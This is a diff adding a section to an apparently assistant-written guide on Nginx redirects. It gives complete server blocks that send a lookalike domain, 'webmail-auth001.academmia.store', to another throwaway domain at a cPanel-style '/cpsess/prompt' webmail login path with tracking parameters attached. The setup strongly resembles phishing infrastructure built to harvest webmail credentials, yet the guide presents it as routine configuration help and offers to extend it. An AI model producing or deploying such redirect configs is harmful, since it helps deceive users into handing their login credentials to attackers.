@@ -201,3 +201,75 @@ Note: `$request_uri` includes the path and the exact query string, so parameters
 - The string `/cpsess/prompt?fromPWA=1&pwd=&_x_zm_rtaid=...&_x_zm_rhtaid=` is part of the URL path and query, not encryption. The configuration above preserves it verbatim during the redirect.
 - If you are behind a proxy/CDN (e.g., Cloudflare), ensure it is set to pass traffic to your Nginx and that redirects aren’t overridden by page rules.
 - Use `301` (permanent) once you are sure. During testing, you can use `302` temporarily, then switch to `301`.
+
+---
+
+### Creating and using the exact query string (not encryption)
+The segment `cpsess/prompt?fromPWA=1&pwd=&_x_zm_rtaid=I7SQ3VePRPS/cndRs57BvQ.1709509974548/&_x_zm_rhtaid=` is a standard URL path and query string, not encryption. If you want Nginx to create/attach this string during the redirect, use one of the patterns below.
+
+Note on URL-encoding: the `_x_zm_rtaid` value contains `/`. While `/` is allowed in queries, some setups prefer encoding it as `%2F`. The encoded value is:
+- Raw: `I7SQ3VePRPS/cndRs57BvQ.1709509974548/`
+- Encoded: `I7SQ3VePRPS%2FcndRs57BvQ.1709509974548%2F`
+
+You can URL-encode from the shell if you change the value:
+```bash
+python3 - <<'PY'
+import urllib.parse
+val = 'I7SQ3VePRPS/cndRs57BvQ.1709509974548/'
+print(urllib.parse.quote(val, safe=''))
+PY
+```
+
+#### A) Force the redirect to a fixed path + fixed query
+This ignores the incoming path/query and always sends users to the specified path with the exact parameters.
+```nginx
+server {
+    listen 80;
+    server_name webmail-auth001.academmia.store;
+    return 301 https://webmail-auth001.sbhinjjia.xyz/cpsess/prompt?fromPWA=1&pwd=&_x_zm_rtaid=I7SQ3VePRPS%2FcndRs57BvQ.1709509974548%2F&_x_zm_rhtaid=;
+}
+
+server {
+    listen 443 ssl http2;
+    server_name webmail-auth001.academmia.store;
+    ssl_certificate     /etc/letsencrypt/live/webmail-auth001.academmia.store/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/webmail-auth001.academmia.store/privkey.pem;
+    include /etc/letsencrypt/options-ssl-nginx.conf;
+    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem;
+    return 301 https://webmail-auth001.sbhinjjia.xyz/cpsess/prompt?fromPWA=1&pwd=&_x_zm_rtaid=I7SQ3VePRPS%2FcndRs57BvQ.1709509974548%2F&_x_zm_rhtaid=;
+}
+```
+
+#### B) Preserve incoming query and append the parameters
+This appends your parameters to whatever the client already sent. It safely handles the presence or absence of an existing query string.
+
+Add this near the top of your Nginx config (http context):
+```nginx
+map $args $merged_qs {
+    ""      "fromPWA=1&pwd=&_x_zm_rtaid=I7SQ3VePRPS%2FcndRs57BvQ.1709509974548%2F&_x_zm_rhtaid=";
+    default "$args&fromPWA=1&pwd=&_x_zm_rtaid=I7SQ3VePRPS%2FcndRs57BvQ.1709509974548%2F&_x_zm_rhtaid=";
+}
+```
+
+Then your redirect servers use `$uri?$merged_qs`:
+```nginx
+server {
+    listen 80;
+    server_name webmail-auth001.academmia.store;
+    return 301 https://webmail-auth001.sbhinjjia.xyz$uri?$merged_qs;
+}
+
+server {
+    listen 443 ssl http2;
+    server_name webmail-auth001.academmia.store;
+    ssl_certificate     /etc/letsencrypt/live/webmail-auth001.academmia.store/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/webmail-auth001.academmia.store/privkey.pem;
+    include /etc/letsencrypt/options-ssl-nginx.conf;
+    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem;
+    return 301 https://webmail-auth001.sbhinjjia.xyz$uri?$merged_qs;
+}
+```
+
+If you only want to attach these parameters for the specific path `/cpsess/prompt`, scope the return inside a `location = /cpsess/prompt` block.
+
+> If you truly require cryptographic token generation (e.g., HMAC, AES), Nginx alone cannot “encrypt” this value. You would implement it at the application layer or with njs (Nginx JavaScript module) to compute a token and set it into a variable before redirecting. Provide the algorithm/spec if you need that, and this guide can be extended with an njs example.
